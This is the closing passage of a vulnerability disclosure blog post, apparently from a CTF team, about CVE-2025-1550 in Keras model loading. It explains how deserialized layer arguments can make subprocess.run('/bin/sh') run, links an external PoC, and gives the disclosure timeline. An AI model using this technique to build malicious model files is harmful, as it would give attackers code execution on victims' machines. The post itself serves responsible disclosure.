<span class="line"><span style="color:#DBD7CAEE">    kwargs </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tree</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">map_structure</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">convert_revived_tensor</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> kwargs</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> kwargs</span></span>
<span class="line"></span></code></pre>
<p>Here, <code>node_data</code> is the content of <code>inbound_nodes</code>. We can see how, by passing <code>args</code> and <code>kwargs</code> as <code>inbound_nodes</code>, they are simply parsed using the same <code>deserialize_keras_object</code> seen before. If we use basic types like strings, it simply returns values without making too many checks.</p>
<p>When <code>deserialize_node</code> returns, the layer is called with the specified arguments:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">args</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> kwargs </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> deserialize_node</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">node_data</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> created_layers</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#758575DD"># Call layer on its inputs, thus creating the node</span></span>
<span class="line"><span style="color:#758575DD"># and building the layer if needed.</span></span>
<span class="line"><span style="color:#DBD7CAEE">layer</span><span style="color:#666666">(</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">args</span><span style="color:#666666">,</span><span style="color:#CB7676"> **</span><span style="color:#DBD7CAEE">kwargs</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>At this point, an attacker can pass <code>"/bin/sh"</code> as an example payload,  thereby obtaining the execution of <code>subprocess.run("/bin/sh")</code> and gaining a shell. Obviously, the attacker can adapt the arguments to their purposes and execute different commands.</p>
<h5 id="proof-of-concept-poc">Proof of Concept (PoC)</h5>
<p>The complete PoC is available on GitHub at <a href="https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-1550">io-no/CVE-2025-1550</a>.</p>
<p>Note that, in the provided folder, the other files of the <code>.keras</code> format (<code>metadata.json</code> and <code>model.weights.h5</code>) are not relevant and never used. They are simply taken from another non-malicious <code>.keras</code> model I created to have a complete <code>.keras</code> file.</p>
<h2 id="disclosure-timeline">Disclosure Timeline</h2>
<ul>
<li>16 December 2024: Reported through Google OSS VRP.</li>
<li>23 December 2024: 🎉 Nice catch!</li>
<li>21 January 2025: A bounty of $3,133.70 was awarded.</li>
<li>5 March 2025: Keras 3.9.0 released with fixes (<a href="https://github.com/keras-team/keras/pull/20751">PR</a>).</li>
</ul>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
&copy; 2025 Tower of Hanoi. All rights reserved.
<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>